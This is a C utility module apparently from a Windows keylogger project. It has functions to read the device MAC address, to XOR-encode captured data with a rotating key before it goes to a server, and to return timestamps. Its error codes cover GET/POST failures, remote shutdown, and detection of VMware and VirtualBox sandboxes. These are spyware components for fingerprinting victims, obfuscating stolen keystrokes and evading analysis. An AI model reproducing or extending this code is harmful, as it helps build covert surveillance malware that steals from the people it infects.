
#include <stdio.h>
#include <iphlpapi.h>

#include "utils.h"


/**
 * Given a string find the mac address for this device and put 
 */
ERR_CODE retrieveMAC(char* mac) {
    DWORD bufferLen = sizeof(IP_ADAPTER_INFO);
    PIP_ADAPTER_INFO adapterInfo = (IP_ADAPTER_INFO *) malloc(sizeof(IP_ADAPTER_INFO));

    if (adapterInfo == NULL) { return ECODE_NULL; }

    if (GetAdaptersInfo(adapterInfo, &bufferLen) != NO_ERROR) { return ECODE_FAILURE; }

    BYTE* addr = adapterInfo->Address;
    sprintf(mac, "%02X:%02X:%02X:%02X:%02X:%02X", addr[0], addr[1], addr[2], addr[3], addr[4], addr[5]);

    printf("Adapater Name: '%s'\n", adapterInfo->AdapterName);
    printf("Adapater MAC: '%s'\n\n", mac);

    free(adapterInfo);
    return ECODE_SUCCESS;
}



/**
 * This code may look weird, however, my encoding function takes a pointer
 * to an unsigned character that is the encoding key, this allows key logger structs
 * to maintain a stateful encoding key to encode many pieces of infomation. However,
 * this also means if we want to encode information outside the keylogger we need 
 * a valid pointer a key! Hence the use of the global unsigned char whose value 
 * we can set to the key and whose address we can reference!
 */
static unsigned char __ENODING_KEY_POINTER__;
unsigned char* freshEncodingKeyPtr(unsigned char key) {
    __ENODING_KEY_POINTER__ = key;
    return &__ENODING_KEY_POINTER__;
}


/**
 * Given a string pointer, iterate through each character and XOR it with 
 * the encoding key. If the current character is the key, or the key is the 
 * null terminator then simply leave the char as is. Then rotate the
 * key right and increment the string
 */
void encode(char* str, unsigned char* encKey) {
    char* s  = str;
    while (*s != '\0') {
        // don't encode chars that match the key or if key is 0
        if (*s != *encKey && *encKey != 0x0) {
            *s ^= *encKey;
        }
        rotateRight(encKey);
        s++;
    }
}

/**
 * Shift the original char (key) to the right 1 bit, then | it 
 * with the same char shifted left by 7 bits. It is an unsigned char 
 * because when testing regular and signed char it didn't work haha
 * e.g ch = 1 2 3 4 5 6 7 8
 * 
 * ch >> 1 == 0 1 2 3 4 5 6 7
 * ch << 7 == 8 0 0 0 0 0 0 0
 * Then take the bitwise OR and we can see how it rotates right!
 * https://stackoverflow.com/questions/13289397/circular-shift-in-c
 */
void rotateRight(unsigned char* ch) {
    *ch = (*ch >> 1) | (*ch << (8 - 1));
}

/**
 * simply retrieevs the current time in seconds. The server handles 
 * conversion for better user viewing
 */
time_t getCurrentTime() {
    time_t seconds;
    time(&seconds);
    return seconds;
}

/**
 * Simply swap a bool value
 */
void swapBOOL(BOOL* value) {
    if (*value == FALSE) { *value = TRUE; }
    else { *value = FALSE; }
}

/**
 * testing function to report err codes
 */
void printErr(ERR_CODE err) {
    printf("ERR: %s\n", getErrMessage(err));
}

/**
 * get appropriate error message based on error code
 */
const char* getErrMessage(ERR_CODE code) {
    switch (code) {
        case ECODE_SUCCESS: return "Success.\n";
        case ECODE_FAILURE: return "Failure.\n";
        case ECODE_SAFE_RET: return "Safely returned.\n";
        case ECODE_INCORRECT_ENC: return "Incorrect encoding.\n";
        case ECODE_DO_SHUTDOWN: return "Remote shutdown...\n";
        case ECODE_GET: return "GET error.\n";
        case ECODE_POST: return "POST error.\n";
        case ECODE_EMPTY_BUFFER: return "Empty buffer.\n";
        case ECODE_FULL_BUFF: return "Full buffer.\n";
        case ECODE_NULL: return "Null pointer.\n";
        case ECODE_VMWARE_DETECTED: return "Detected VMWare!\n";
        case ECODE_VBOX_DETECTED: return "Detected VBox!\n";
        // default: return "Unknown error"; // should never be hit
    }
    return "Unknown error"; // should never be hit
}
